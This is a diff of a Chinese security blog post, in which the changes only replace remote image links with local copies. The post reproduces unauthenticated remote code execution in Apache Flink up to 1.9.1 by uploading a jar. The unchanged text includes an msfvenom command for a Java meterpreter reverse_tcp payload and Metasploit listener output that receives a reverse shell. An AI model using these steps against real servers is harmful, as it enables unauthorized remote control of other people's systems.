@@ -49,13 +49,13 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aomCajnZVA9WlnBqTE\_QPg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2ibQicHibY6xFUL37mnBF9dP6TZd6s4O3HNYH5aGEiaNWPKibrMC0dH9O5ng/640?wx_fmt=jpeg)
+![](../../.resource/remote/ddc362413b4dffdf98e20c9973a675477dc06c8aca459d0cd73ccee73eb2d192.jpg)
 
 好久没更新了，今天趁 1024 更新一篇，最近工作中遇到这个漏洞，今天自己来做一下这个漏洞复现。  
 
 Apache Flink 未授权访问 - 远程代码命令执行 - 复现
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2ZicpFA9aae4QzmqibdyErO2VmtSIhBWJk6y14KDq7p2HOibMqvTVWxMtg/640?wx_fmt=png)
+![](../../.resource/remote/a13abf1a5470cb3591c7052962aea61874e1d323aa30cfcedb1c132eda0446ab.png)
 
 一、漏洞简介
 
@@ -73,7 +73,7 @@ Apache Flink <= 1.9.1(最新版本)
 msfvenom -p java/meterpreter/reverse\_tcp LHOST=XX.XX.XX.XX LPORT=4444 -f jar > rce.jar
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ29NcynmIT5zyhzFzJFb3najTKY1hoWqRxoVlq0FJt19rUq60Ip1suiag/640?wx_fmt=png)
+![](../../.resource/remote/0c7d060901226bc863ed42d83bf7d7467ba0aee978616afb0326756f8356d5a9.png)
 
 2、msf 设置监听  
 
@@ -112,15 +112,15 @@ msf5 exploit(multi/handler) > exploit
 \[\*\] Started reverse TCP handler on XX.XX.XX.XX:4444
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2NglLRz2ERUXYEIpq8dsUoDJVU4ht7Eo87wqcOqxOTzxX4UuLTpcyeg/640?wx_fmt=png)
+![](../../.resource/remote/38d262434481d8682ec372bf77e67aea23b7b25b44cd75742e494e9117dbffc8.png)
 
 3、上传 Jar 包，并且提交
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2ISveMsiau7Y6ADiaA0z1BKy99iaLZHibklQaxXZgZxgDUFdo0LjWBCKy3w/640?wx_fmt=png)
+![](../../.resource/remote/57878d2d8a9c804bdb4164a73e6b5450e81ba8451e2600e116995eb361d6cd38.png)
 
 监听接受反弹的 shell，获取权限  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2KIMaD4Wal5uARCpI5HYhDGCb67iaAd4J8aBCj5L3KKTcbaZ7ibxSQ11w/640?wx_fmt=png)
+![](../../.resource/remote/c0ac4aed13ec9ae22a3cb94c09447839ac357368b74102c17611ff19ed7f8491.png)
 
 四、安全建议
 
@@ -146,7 +146,7 @@ thelostworld
 
 安全路上，与你并肩前行！！！！
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)
+![](../../.resource/remote/7a6d2f13ca361326dd71145e64ce4b16b853688149568ad8f7594066b738e9c1.jpg)
 
 个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns
 
@@ -154,7 +154,7 @@ thelostworld
 
 个人 CSDN：https://blog.csdn.net/qq\_37602797/category\_10169006.html
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)
+![](../../.resource/remote/64b19fa585837043e1eae7cea904e1b86a2db6ccb2fdde1d09513641413365d6.png)
 
 ---
 
